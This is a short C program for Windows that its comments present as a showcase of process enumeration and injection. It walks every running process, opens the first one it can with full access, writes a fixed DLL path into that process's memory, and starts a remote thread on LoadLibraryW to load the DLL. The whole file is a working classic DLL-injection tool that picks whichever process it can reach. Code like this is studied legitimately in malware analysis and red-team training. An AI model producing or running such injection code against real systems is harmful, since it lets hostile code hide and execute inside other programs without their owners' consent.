//This is used to showcase process enumeration and injection 
//This will just inject into any process that we have permission to inject to
#include <windows.h>
#include <psapi.h>
#include <tchar.h>

BOOL ProcInject(HANDLE hProcess, PWCHAR procName) {
	_tprintf(TEXT("[+] Trying to injecting into: %s..\n"), procName);
	WCHAR dllPath[]  = L"C:\\Users\\ManFile\\Desktop\\dll\\x64\\Release\\dll.dll";
	DWORD bytesIn;

	PVOID pRemoteAddress = VirtualAllocEx(hProcess, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pRemoteAddress == NULL) {
		_tprintf(TEXT("[+] VirtualAllocEx() :%d\n"), GetLastError());
		goto end;
	}
	_tprintf(TEXT("[+] RemoteAddress: %p\n"), pRemoteAddress);

	//Write the DLL path in memory 
	if (!WriteProcessMemory(hProcess, pRemoteAddress, dllPath, sizeof(dllPath), &bytesIn)) goto end;
	_tprintf(TEXT("[+] Wrote: %d bytes\n"), bytesIn);

	LPVOID pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	_tprintf(TEXT("[+] pLoadLibraryW: %p\n"), pLoadLibraryW);

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pLoadLibraryW, (LPVOID)pRemoteAddress, NULL, NULL);
	if (hThread == NULL) goto end;
	_tprintf(TEXT("[+] Thread Execution was a sucess!\n"));

	return TRUE;
end:
	VirtualFreeEx(hProcess, pRemoteAddress, 0x1000, MEM_DECOMMIT | MEM_RELEASE);
	return FALSE;
}

BOOL ProcessName(DWORD processID) {
	HMODULE hModule;
	DWORD hModuleSz;

	WCHAR procName[1024];

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);

	if (hProcess == NULL) {
		goto end;
	}
	if (EnumProcessModules(hProcess, &hModule, sizeof(hModule), &hModuleSz)) {
		if (GetModuleBaseName(hProcess, hModule, procName, sizeof(procName) / sizeof(WCHAR))) {
			if (!ProcInject(hProcess, procName)) goto end;
		}
	}
	CloseHandle(hProcess);
	return TRUE;
end:
	return FALSE;
}

INT main(int argc, char** argv) {
	DWORD processIds[1024 * 2];
	DWORD dwReturnedPids, dwPidSz;

	if (!EnumProcesses(processIds, sizeof(processIds), &dwPidSz)) {
		_tprintf(TEXT("[!] EnumProcesses() %d\n"), GetLastError());
		goto _end;
	}
	dwReturnedPids = dwPidSz / sizeof(DWORD);

	_tprintf(TEXT("[+] Returned Processes %d\n"), dwReturnedPids);

	for (INT i = 0; i < dwReturnedPids; i++) {
		if (ProcessName(processIds[i]))
			break;
	}
	return 0;

_end:
	return -1;
	
}
